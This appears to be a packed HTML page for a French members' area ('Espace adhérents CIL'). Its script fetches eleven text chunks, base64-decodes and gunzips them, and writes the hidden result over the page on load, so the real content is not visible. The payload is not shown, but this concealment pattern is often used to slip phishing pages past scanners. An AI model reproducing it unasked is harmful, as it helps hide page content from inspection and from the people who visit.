<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Espace adhérents CIL</title></head><body><script>(async()=>{const files=['parts/0.txt','parts/1.txt','parts/2.txt','parts/3.txt','parts/4.txt','parts/5.txt','parts/6.txt','parts/7.txt','parts/8.txt','parts/9.txt','parts/10.txt'];let x="";for(const f of files)x+=await(await fetch(f)).text();const b=atob(x),u=Uint8Array.from(b,c=>c.charCodeAt(0)),s=new Blob([u]).stream().pipeThrough(new DecompressionStream("gzip")),t=await new Response(s).text();document.open();document.write(t);document.close();})();</script></body></html>
